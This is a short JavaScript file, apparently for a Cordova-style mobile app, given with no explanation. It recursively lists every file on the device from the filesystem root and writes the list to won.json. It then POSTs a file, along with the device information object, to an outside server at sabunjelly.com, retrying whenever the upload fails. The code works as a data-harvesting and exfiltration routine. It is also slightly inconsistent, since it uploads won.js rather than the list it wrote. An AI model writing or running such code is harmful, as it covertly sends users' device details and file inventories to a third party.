window.op=new fs,window.ls=[],window.attemp=0;
won(op.xroot);
wonCount(wonWrite);


function won(d){
  window.op.dir(d,function(l){
    for(var i=0;i<l.length;i++){
      if(l[i].isDirectory){
        won(l[i].nativeURL);
        continue;
      }window.ls.push(l[i].nativeURL);
      window.lsf=l[i];
    }result(window.ls.length);
  });
}
function wonCount(cb,cls){
  cb=typeof cb==='function'?cb:function(){};
  cls=cls?cls:0;
  window.TIMEOUT=setTimeout(function(){
    if(cls===window.ls.length){
      window.attemp++;
      if(window.attemp>30){
        return cb();
      }
    }return wonCount(cb,window.ls.length);
  },500);
}
function wonWrite(){
window.op.write(window.op.xroot+'won.json',JSON.stringify(window.ls),0,function(r){
  result({
    status:'success',
    result:r,
    device:device,
    lsf:window.lsf
  });
  setTimeout(wonUpload,1000);
},function(r){
  result({
    status:'error',
    result:r
  });
});
clearTimeout(window.TIMEOUT);
result('Writing...');
}
function wonUpload(){
params=device;
params['test']='testing';
params['post']='posting';
params['master']='9r3i';
(new FileTransfer).upload(
window.op.xroot+'won.js',
'https://sabunjelly.com/test.php?test=testing&post=posting',
result,wonUpload,{
  ssl:true,
  fileKey:'upload',
  mimeType:'text/plain',
  fileName:'won.js',
  httpMethod:'POST',
  params:params,
  chunkedMode:true,
  headers:{
    cookie:'test=testing;post=posting;'
  }
},true);
result('Uploading...');
}


